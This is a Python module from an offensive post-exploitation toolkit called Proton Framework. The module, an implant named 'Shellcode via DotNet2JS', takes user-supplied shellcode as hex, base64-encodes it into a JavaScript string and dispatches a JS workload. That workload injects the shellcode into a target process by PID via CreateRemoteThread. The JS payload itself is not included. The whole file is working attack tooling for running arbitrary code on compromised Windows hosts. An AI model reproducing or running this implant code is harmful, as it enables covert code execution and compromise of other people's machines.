#!/usr/bin/env python3

#            ---------------------------------------------------
#                             Proton Framework              
#            ---------------------------------------------------
#                Copyright (C) <2019-2020>  <Entynetproject>
#
#        This program is free software: you can redistribute it and/or modify
#        it under the terms of the GNU General Public License as published by
#        the Free Software Foundation, either version 3 of the License, or
#        any later version.
#
#        This program is distributed in the hope that it will be useful,
#        but WITHOUT ANY WARRANTY; without even the implied warranty of
#        MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE. See the
#        GNU General Public License for more details.
#
#        You should have received a copy of the GNU General Public License
#        along with this program.  If not, see <http://www.gnu.org/licenses/>.

import core.implant
import core.job
import base64
import os.path
import binascii

class SDotNet2JSJob(core.job.Job):
    def create(self):
        self.errstat = 0
        self.options.set("SC_B64", self.scb64(self.options.get("SC_HEX")))

    def scb64(self, path):
        if os.path.isfile(path):
            with open(path, 'r') as fileobj:
                text = base64.b64encode(binascii.unhexlify(fileobj.read())).decode()
        else:
            text = base64.b64encode(binascii.unhexlify(path)).decode()

        index = 0
        ret = '"';
        for c in text:
            ret += str(c)
            index += 1
            if index % 100 == 0:
                ret += '"+\r\n"'

        ret += '"'
        return ret

    def report(self, handler, data, sanitize = False):
        data = data.decode('latin-1')

        if len(data) == 0:
            handler.reply(200)
            return

        if data == "Complete" and self.errstat != 1:
            super(SDotNet2JSJob, self).report(handler, data)

        #self.print_good(data)

        handler.reply(200)

    def done(self):
        self.results = "Complete"
        self.display()

    def display(self):
        try:
            self.print_good(self.data)
        except:
            pass
        #self.shell.print_plain(str(self.errno))

class SDotNet2JSImplant(core.implant.Implant):

    NAME = "Shellcode via DotNet2JS"
    DESCRIPTION = "Executes arbitrary shellcode using the DotNet2JS technique. Inject shellcode into a host process via createremotethread as a new thread."
    AUTHORS = ["Entynetproject"]
    STATE = "implant/inject/shellcode_dotnet2js"

    def load(self):
        self.options.register("DLLCOMMANDS", "", "String to pass to dll if needed.", required=False)
        self.options.register("SC_HEX", "", "Relative path to shellcode/dll hex or paste hex string.", required=True)
        self.options.register("SC_B64", "", "Shellcode in base64.", advanced=True)
        self.options.register("DLLOFFSET", "0", "Offset to the reflective loader.", advanced=True)
        self.options.register("PID", "0", "Process ID to inject into (0 = current process).", required=True)

    def job(self):
        return SDotNet2JSJob

    def run(self):
        workloads = {}
        workloads["js"] = "data/implant/inject/shellcode_dotnet2js.js"

        self.dispatch(workloads, self.job)
